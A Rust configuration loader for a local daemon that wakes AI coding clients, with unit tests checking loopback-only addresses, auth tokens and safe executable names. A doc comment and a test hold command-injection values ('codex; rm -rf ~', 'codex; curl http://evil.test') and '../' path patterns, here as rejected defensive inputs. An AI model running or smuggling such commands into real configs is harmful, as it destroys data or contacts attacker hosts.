//! Reads and checks `config.json`.
//!
//! The daemon refuses a configuration with one value that is not valid, and the error names the
//! path of that value, for example `wake.codex.command`. By default, the daemon and the URLs that
//! it calls stay on this machine.

use std::collections::{BTreeMap, HashMap};
use std::fmt;

use serde_json::{Map, Value};
use url::{Host, Url};

/// The environment variables, as a map: the tests give their own values.
pub type EnvMap = HashMap<String, String>;

const MAX_NAME_LEN: usize = 64;
const MAX_PROMPT_BYTES: usize = 16_384;
const MAX_RETRY_DELAYS: usize = 16;

/// The configuration of the daemon.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct BridgeConfig {
    pub port: u16,
    /// The maximum size of one message.
    pub max_message_bytes: usize,
    /// `None` when the file has no `auth` object: then authentication is off.
    pub auth: Option<AuthConfig>,
    /// The wake targets, by name.
    pub wake: BTreeMap<String, WakeTarget>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AuthConfig {
    /// False only when the file sets `"required": false`.
    pub required: bool,
    /// The clients, by name.
    pub clients: BTreeMap<String, AuthClientConfig>,
}

/// The settings of one client, for example `claude`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AuthClientConfig {
    /// The token, written in the file.
    pub token: Option<String>,
    /// The variable of `tokens.env` that contains the token.
    pub token_env: Option<String>,
    /// The mailboxes that this client can use, for example `claude-*`.
    pub agents: Vec<String>,
    /// The mailboxes that `ping` shows to this client. The default is `agents`.
    pub directory: Option<Vec<String>>,
    /// An admin can use all mailboxes and delete all mail.
    pub admin: bool,
}

/// The settings of all wake targets.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WakeCommon {
    /// The text of the wake. `{mailbox}` becomes the mailbox name.
    pub prompt: String,
    /// The minimum time after a successful wake of the same mailbox.
    pub debounce_seconds: u32,
    /// The maximum number of wakes for one mailbox in one hour.
    pub max_wakes_per_hour: u32,
}

/// A client that the daemon can wake.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum WakeTarget {
    /// An `OpenCode` server. The daemon sends the wake to its HTTP API.
    Opencode {
        base_url: String,
        common: WakeCommon,
    },
    /// The Codex CLI. The daemon runs `codex queue` for the session.
    Codex {
        command: String,
        retry_delays_seconds: Vec<u32>,
        common: WakeCommon,
    },
}

impl WakeTarget {
    #[must_use]
    pub fn common(&self) -> &WakeCommon {
        match self {
            Self::Opencode { common, .. } | Self::Codex { common, .. } => common,
        }
    }
}

/// What is wrong with a configuration value.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Problem {
    NotObject,
    NotString,
    NotArray,
    IntegerOutOfRange { min: u64, max: u64 },
    Empty,
    TooLarge,
    ShellCommand,
    InvalidName,
    InvalidPattern,
    MissingToken,
    TooManyEntries { max: usize },
    UnknownWakeType,
    InvalidUrl,
    NotHttp,
    NonLoopback { unsafe_variable: &'static str },
}

impl fmt::Display for Problem {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::NotObject => write!(f, "must be an object"),
            Self::NotString => write!(f, "must be a string"),
            Self::NotArray => write!(f, "must be an array"),
            Self::IntegerOutOfRange { min, max } => {
                write!(f, "must be an integer from {min} to {max}")
            }
            Self::Empty => write!(f, "must not be empty"),
            Self::TooLarge => write!(f, "is too large"),
            Self::ShellCommand => {
                write!(f, "must be an executable path or name, not a shell command")
            }
            Self::InvalidName => {
                write!(f, "is not a valid name: expected 1-64 chars of [a-z0-9_-]")
            }
            Self::InvalidPattern => write!(f, "contains an invalid agent pattern"),
            Self::MissingToken => write!(f, "must define token or tokenEnv"),
            Self::TooManyEntries { max } => write!(f, "must have at most {max} entries"),
            Self::UnknownWakeType => write!(f, "must be \"opencode\" or \"codex\""),
            Self::InvalidUrl => write!(f, "is not a valid URL"),
            Self::NotHttp => write!(f, "must be an http URL"),
            Self::NonLoopback { unsafe_variable } => write!(
                f,
                "is not a loopback address; set {unsafe_variable}=1 only for a trusted private endpoint"
            ),
        }
    }
}

#[derive(Debug, thiserror::Error)]
pub enum ConfigError {
    #[error("config is not valid JSON: {0}")]
    Json(#[from] serde_json::Error),
    #[error("{path} {problem}")]
    Invalid { path: String, problem: Problem },
}

fn invalid(path: impl Into<String>, problem: Problem) -> ConfigError {
    ConfigError::Invalid {
        path: path.into(),
        problem,
    }
}

/// Returns `true` when the variable is `1`, `true` or `yes`.
fn unsafe_enabled(env: &EnvMap, name: &str) -> bool {
    env.get(name)
        .is_some_and(|value| matches!(value.to_ascii_lowercase().as_str(), "1" | "true" | "yes"))
}

/// Returns `true` for a mailbox or client name: 1 to 64 chars of `[a-z0-9_-]`.
#[must_use]
pub fn is_agent_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= MAX_NAME_LEN
        && name
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'_' || b == b'-')
}

/// Returns `true` for `*`, a name, or a name followed by `*`.
#[must_use]
pub fn is_agent_pattern(pattern: &str) -> bool {
    pattern == "*" || is_agent_name(pattern.strip_suffix('*').unwrap_or(pattern))
}

#[must_use]
pub fn is_loopback_bind_host(host: &str) -> bool {
    matches!(host, "127.0.0.1" | "localhost" | "::1")
}

/// Returns the listen address of the daemon: `INBAND_BIND`, else `127.0.0.1`.
///
/// # Errors
///
/// Returns an error for an address that other machines can reach, unless
/// `INBAND_UNSAFE_REMOTE_BIND=1`.
pub fn resolve_bind_host(env: &EnvMap) -> Result<String, ConfigError> {
    let host = env
        .get("INBAND_BIND")
        .map(|value| value.trim())
        .filter(|value| !value.is_empty())
        .unwrap_or("127.0.0.1");
    if is_loopback_bind_host(host) || unsafe_enabled(env, "INBAND_UNSAFE_REMOTE_BIND") {
        return Ok(host.to_owned());
    }
    Err(invalid(
        format!("INBAND_BIND \"{host}\""),
        Problem::NonLoopback {
            unsafe_variable: "INBAND_UNSAFE_REMOTE_BIND",
        },
    ))
}

fn is_loopback_url_host(url: &Url) -> bool {
    match url.host() {
        Some(Host::Domain(domain)) => domain.eq_ignore_ascii_case("localhost"),
        Some(Host::Ipv4(ip)) => ip.is_loopback(),
        Some(Host::Ipv6(ip)) => ip.is_loopback(),
        None => false,
    }
}

/// Returns an http base URL without trailing `/`, query and fragment.
///
/// # Errors
///
/// Returns an error when the URL is not valid, does not use http, or points to another machine
/// (unless `INBAND_UNSAFE_REMOTE_URLS=1`).
pub fn normalize_loopback_http_base_url(raw: &str, env: &EnvMap) -> Result<String, ConfigError> {
    let path = format!("URL \"{raw}\"");
    let mut url = Url::parse(raw.trim()).map_err(|_| invalid(&path, Problem::InvalidUrl))?;
    if url.scheme() != "http" {
        return Err(invalid(&path, Problem::NotHttp));
    }
    if !is_loopback_url_host(&url) && !unsafe_enabled(env, "INBAND_UNSAFE_REMOTE_URLS") {
        return Err(invalid(
            &path,
            Problem::NonLoopback {
                unsafe_variable: "INBAND_UNSAFE_REMOTE_URLS",
            },
        ));
    }
    let trimmed = url.path().trim_end_matches('/').to_owned();
    url.set_path(&trimmed);
    url.set_query(None);
    url.set_fragment(None);
    Ok(url.as_str().trim_end_matches('/').to_owned())
}

fn object<'a>(value: &'a Value, path: &str) -> Result<&'a Map<String, Value>, ConfigError> {
    value
        .as_object()
        .ok_or_else(|| invalid(path, Problem::NotObject))
}

fn string<'a>(value: Option<&'a Value>, path: &str) -> Result<&'a str, ConfigError> {
    value
        .and_then(Value::as_str)
        .ok_or_else(|| invalid(path, Problem::NotString))
}

fn integer(value: Option<&Value>, path: &str, min: u64, max: u64) -> Result<u64, ConfigError> {
    value
        .and_then(Value::as_u64)
        .filter(|n| (min..=max).contains(n))
        .ok_or_else(|| invalid(path, Problem::IntegerOutOfRange { min, max }))
}

/// Reads an integer from 1 to 3600.
fn small_integer(value: Option<&Value>, path: &str) -> Result<u32, ConfigError> {
    let n = integer(value, path, 1, 3600)?;
    u32::try_from(n).map_err(|_| invalid(path, Problem::IntegerOutOfRange { min: 1, max: 3600 }))
}

/// Reads a wake prompt: not empty, 16 KiB at most.
fn prompt(value: Option<&Value>, path: &str) -> Result<String, ConfigError> {
    let text = string(value, path)?;
    if text.trim().is_empty() {
        return Err(invalid(path, Problem::Empty));
    }
    if text.len() > MAX_PROMPT_BYTES {
        return Err(invalid(path, Problem::TooLarge));
    }
    Ok(text.to_owned())
}

/// Reads the path or the name of an executable.
///
/// The daemon runs it without a shell, so the value can contain only letters, digits, `_`, `.`, `/`
/// and `-`. A shell command such as `codex; rm -rf ~` is refused.
fn command(value: Option<&Value>, path: &str) -> Result<String, ConfigError> {
    let text = string(value, path)?.trim();
    if text.is_empty() {
        return Err(invalid(path, Problem::Empty));
    }
    let allowed = |b: u8| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'.' | b'/' | b'-');
    if !text.bytes().all(allowed) {
        return Err(invalid(path, Problem::ShellCommand));
    }
    Ok(text.to_owned())
}

/// Reads one entry of `wake`. `name` is the key of the entry, for the error paths.
fn wake_target(name: &str, value: &Value, env: &EnvMap) -> Result<WakeTarget, ConfigError> {
    let path = format!("wake.{name}");
    let fields = object(value, &path)?;
    let kind = string(fields.get("type"), &format!("{path}.type"))?;
    let common = WakeCommon {
        prompt: prompt(fields.get("prompt"), &format!("{path}.prompt"))?,
        debounce_seconds: small_integer(
            fields.get("debounceSeconds"),
            &format!("{path}.debounceSeconds"),
        )?,
        max_wakes_per_hour: small_integer(
            fields.get("maxWakesPerHour"),
            &format!("{path}.maxWakesPerHour"),
        )?,
    };
    match kind {
        "opencode" => {
            let base_url_path = format!("{path}.baseUrl");
            let raw = string(fields.get("baseUrl"), &base_url_path)?;
            let base_url =
                normalize_loopback_http_base_url(raw, env).map_err(|error| match error {
                    ConfigError::Invalid { problem, .. } => invalid(&base_url_path, problem),
                    other @ ConfigError::Json(_) => other,
                })?;
            Ok(WakeTarget::Opencode { base_url, common })
        }
        "codex" => {
            let delays_path = format!("{path}.retryDelaysSeconds");
            let delays = fields
                .get("retryDelaysSeconds")
                .and_then(Value::as_array)
                .ok_or_else(|| invalid(&delays_path, Problem::NotArray))?;
            if delays.len() > MAX_RETRY_DELAYS {
                return Err(invalid(
                    &delays_path,
                    Problem::TooManyEntries {
                        max: MAX_RETRY_DELAYS,
                    },
                ));
            }
            let retry_delays_seconds = delays
                .iter()
                .enumerate()
                .map(|(index, delay)| {
                    small_integer(Some(delay), &format!("{delays_path}[{index}]"))
                })
                .collect::<Result<Vec<_>, _>>()?;
            Ok(WakeTarget::Codex {
                command: command(fields.get("command"), &format!("{path}.command"))?,
                retry_delays_seconds,
                common,
            })
        }
        _ => Err(invalid(format!("{path}.type"), Problem::UnknownWakeType)),
    }
}

/// Reads a list of mailbox patterns, in lower case. An empty list is refused.
fn patterns(value: &Value, path: &str) -> Result<Vec<String>, ConfigError> {
    let items = value.as_array().filter(|items| !items.is_empty());
    let items = items.ok_or_else(|| invalid(path, Problem::NotArray))?;
    items
        .iter()
        .map(|item| {
            let pattern = item
                .as_str()
                .ok_or_else(|| invalid(path, Problem::NotString))?
                .trim()
                .to_ascii_lowercase();
            if is_agent_pattern(&pattern) {
                Ok(pattern)
            } else {
                Err(invalid(path, Problem::InvalidPattern))
            }
        })
        .collect()
}

/// Reads the `auth` object, or returns `None` when there is none.
///
/// Each client needs a token, in `token` or through `tokenEnv`. Authentication stays on unless
/// `required` is exactly `false`.
fn auth_config(value: Option<&Value>) -> Result<Option<AuthConfig>, ConfigError> {
    let Some(value) = value else {
        return Ok(None);
    };
    let fields = object(value, "auth")?;
    let raw_clients = object(
        fields.get("clients").unwrap_or(&Value::Null),
        "auth.clients",
    )?;
    let mut clients = BTreeMap::new();
    for (client_id, raw_client) in raw_clients {
        if !is_agent_name(client_id) {
            return Err(invalid(
                format!("auth client id \"{client_id}\""),
                Problem::InvalidName,
            ));
        }
        let path = format!("auth.clients.{client_id}");
        let client = object(raw_client, &path)?;
        let agents = patterns(
            client.get("agents").unwrap_or(&Value::Null),
            &format!("{path}.agents"),
        )?;
        let directory = client
            .get("directory")
            .map(|value| patterns(value, &format!("{path}.directory")))
            .transpose()?;
        let token = client
            .get("token")
            .map(|value| string(Some(value), &format!("{path}.token")).map(str::to_owned))
            .transpose()?;
        let token_env = client
            .get("tokenEnv")
            .map(|value| string(Some(value), &format!("{path}.tokenEnv")).map(str::to_owned))
            .transpose()?;
        if token.as_deref().is_none_or(str::is_empty)
            && token_env.as_deref().is_none_or(str::is_empty)
        {
            return Err(invalid(path, Problem::MissingToken));
        }
        let admin = client
            .get("admin")
            .and_then(Value::as_bool)
            .unwrap_or(false);
        clients.insert(
            client_id.clone(),
            AuthClientConfig {
                token,
                token_env,
                agents,
                directory,
                admin,
            },
        );
    }
    let required = fields.get("required").and_then(Value::as_bool) != Some(false);
    Ok(Some(AuthConfig { required, clients }))
}

/// Reads and checks the text of `config.json`.
///
/// # Errors
///
/// Returns an error when the text is not JSON, or for the first value that is not valid.
pub fn load_bridge_config(raw: &str, env: &EnvMap) -> Result<BridgeConfig, ConfigError> {
    let parsed: Value = serde_json::from_str(raw)?;
    let fields = object(&parsed, "config")?;

    let raw_wake = object(fields.get("wake").unwrap_or(&Value::Null), "wake")?;
    let mut wake = BTreeMap::new();
    for (name, target) in raw_wake {
        if !is_agent_name(name) {
            return Err(invalid(
                format!("wake target name \"{name}\""),
                Problem::InvalidName,
            ));
        }
        wake.insert(name.clone(), wake_target(name, target, env)?);
    }

    let port = integer(fields.get("port"), "port", 1, 65_535)?;
    let max_message_bytes = integer(
        fields.get("maxMessageBytes"),
        "maxMessageBytes",
        1,
        1_048_576,
    )?;
    Ok(BridgeConfig {
        port: u16::try_from(port).map_err(|_| {
            invalid(
                "port",
                Problem::IntegerOutOfRange {
                    min: 1,
                    max: 65_535,
                },
            )
        })?,
        max_message_bytes: usize::try_from(max_message_bytes).map_err(|_| {
            invalid(
                "maxMessageBytes",
                Problem::IntegerOutOfRange {
                    min: 1,
                    max: 1_048_576,
                },
            )
        })?,
        auth: auth_config(fields.get("auth"))?,
        wake,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn env(pairs: &[(&str, &str)]) -> EnvMap {
        pairs
            .iter()
            .map(|(k, v)| ((*k).to_owned(), (*v).to_owned()))
            .collect()
    }

    fn error_text(result: Result<BridgeConfig, ConfigError>) -> String {
        result.expect_err("config should be rejected").to_string()
    }

    #[test]
    fn bind_host_is_loopback_unless_explicitly_allowed() {
        assert_eq!(resolve_bind_host(&env(&[])).unwrap(), "127.0.0.1");
        assert_eq!(
            resolve_bind_host(&env(&[("INBAND_BIND", "localhost")])).unwrap(),
            "localhost"
        );
        assert_eq!(
            resolve_bind_host(&env(&[("INBAND_BIND", "::1")])).unwrap(),
            "::1"
        );
        assert!(is_loopback_bind_host("127.0.0.1"));
        assert!(!is_loopback_bind_host("0.0.0.0"));

        for host in ["0.0.0.0", "192.168.1.10"] {
            let error = resolve_bind_host(&env(&[("INBAND_BIND", host)]))
                .unwrap_err()
                .to_string();
            assert!(error.contains("not a loopback"), "{error}");
        }
        let allowed = env(&[
            ("INBAND_BIND", "0.0.0.0"),
            ("INBAND_UNSAFE_REMOTE_BIND", "1"),
        ]);
        assert_eq!(resolve_bind_host(&allowed).unwrap(), "0.0.0.0");
    }

    #[test]
    fn base_urls_are_normalized_and_loopback_only() {
        let none = env(&[]);
        assert_eq!(
            normalize_loopback_http_base_url(" http://127.0.0.1:14096/ ", &none).unwrap(),
            "http://127.0.0.1:14096"
        );
        assert_eq!(
            normalize_loopback_http_base_url("http://localhost:14096", &none).unwrap(),
            "http://localhost:14096"
        );
        assert_eq!(
            normalize_loopback_http_base_url("http://[::1]:14096", &none).unwrap(),
            "http://[::1]:14096"
        );
        assert_eq!(
            normalize_loopback_http_base_url("http://127.0.0.1:7447/api/?q=1#x", &none).unwrap(),
            "http://127.0.0.1:7447/api"
        );

        let remote =
            normalize_loopback_http_base_url("http://bridge.example.test", &none).unwrap_err();
        assert!(remote.to_string().contains("not a loopback"));
        let file = normalize_loopback_http_base_url("file:///tmp/socket", &none).unwrap_err();
        assert!(file.to_string().contains("http"));

        let allowed = env(&[("INBAND_UNSAFE_REMOTE_URLS", "yes")]);
        assert!(normalize_loopback_http_base_url("http://bridge.example.test", &allowed).is_ok());
    }

    const VALID: &str = r#"{
      "port": 7447,
      "maxMessageBytes": 65536,
      "wake": {
        "opencode": { "type": "opencode", "baseUrl": "http://127.0.0.1:14096/", "prompt": "wake",
                      "debounceSeconds": 30, "maxWakesPerHour": 20 },
        "codex": { "type": "codex", "command": "codex", "prompt": "mail for {mailbox}",
                   "debounceSeconds": 30, "maxWakesPerHour": 20, "retryDelaysSeconds": [5, 15, 30, 60] }
      }
    }"#;

    #[test]
    fn accepts_a_valid_config_and_normalizes_wake_urls() {
        let config = load_bridge_config(VALID, &env(&[])).unwrap();
        assert_eq!(config.port, 7447);
        assert!(config.auth.is_none());
        match &config.wake["opencode"] {
            WakeTarget::Opencode { base_url, .. } => assert_eq!(base_url, "http://127.0.0.1:14096"),
            other @ WakeTarget::Codex { .. } => panic!("unexpected target {other:?}"),
        }
        match &config.wake["codex"] {
            WakeTarget::Codex {
                retry_delays_seconds,
                ..
            } => assert_eq!(retry_delays_seconds, &[5, 15, 30, 60]),
            other @ WakeTarget::Opencode { .. } => panic!("unexpected target {other:?}"),
        }
    }

    #[test]
    fn rejects_out_of_range_numbers() {
        let none = env(&[]);
        assert!(
            error_text(load_bridge_config(
                r#"{"port":70000,"maxMessageBytes":10,"wake":{}}"#,
                &none
            ))
            .contains("port")
        );
        assert!(
            error_text(load_bridge_config(
                r#"{"port":7447,"maxMessageBytes":0,"wake":{}}"#,
                &none
            ))
            .contains("maxMessageBytes")
        );
        assert!(
            error_text(load_bridge_config(
                r#"{"port":7447,"maxMessageBytes":1,"wake":[]}"#,
                &none
            ))
            .contains("wake")
        );
    }

    #[test]
    fn rejects_remote_wake_urls_and_shell_commands() {
        let none = env(&[]);
        let remote = r#"{"port":7447,"maxMessageBytes":65536,"wake":{"opencode":{"type":"opencode",
          "baseUrl":"http://example.test:14096","prompt":"wake","debounceSeconds":30,"maxWakesPerHour":20}}}"#;
        assert!(error_text(load_bridge_config(remote, &none)).contains("not a loopback"));

        let shell = r#"{"port":7447,"maxMessageBytes":65536,"wake":{"codex":{"type":"codex",
          "command":"codex; curl http://evil.test","prompt":"mail","debounceSeconds":30,
          "maxWakesPerHour":20,"retryDelaysSeconds":[5]}}}"#;
        assert!(error_text(load_bridge_config(shell, &none)).contains("shell command"));
    }

    #[test]
    fn rejects_invalid_agent_and_directory_patterns() {
        let none = env(&[]);
        let agents = r#"{"port":7447,"maxMessageBytes":65536,"wake":{},
          "auth":{"clients":{"claude":{"token":"t","agents":["../codex-*"]}}}}"#;
        assert!(error_text(load_bridge_config(agents, &none)).contains("agent pattern"));

        let directory = r#"{"port":7447,"maxMessageBytes":65536,"wake":{},
          "auth":{"clients":{"codex":{"token":"t","agents":["codex-*"],"directory":["../claude-*"]}}}}"#;
        assert!(error_text(load_bridge_config(directory, &none)).contains("directory"));

        let no_token = r#"{"port":7447,"maxMessageBytes":65536,"wake":{},
          "auth":{"clients":{"codex":{"agents":["codex-*"]}}}}"#;
        assert!(error_text(load_bridge_config(no_token, &none)).contains("token"));
    }

    #[test]
    fn auth_is_required_unless_explicitly_disabled() {
        let none = env(&[]);
        let base = r#"{"port":7447,"maxMessageBytes":65536,"wake":{},"auth":{"clients":{}}}"#;
        assert!(
            load_bridge_config(base, &none)
                .unwrap()
                .auth
                .unwrap()
                .required
        );
        let off = r#"{"port":7447,"maxMessageBytes":65536,"wake":{},"auth":{"required":false,"clients":{}}}"#;
        assert!(
            !load_bridge_config(off, &none)
                .unwrap()
                .auth
                .unwrap()
                .required
        );
    }

    #[test]
    fn agent_names_and_patterns() {
        assert!(is_agent_name(&"a".repeat(64)));
        assert!(!is_agent_name(&"a".repeat(65)));
        assert!(!is_agent_name(""));
        assert!(!is_agent_name("Claude"));
        assert!(is_agent_pattern("*"));
        assert!(is_agent_pattern("claude-*"));
        assert!(!is_agent_pattern("claude-*-*"));
        assert!(!is_agent_pattern("../x"));
    }
}
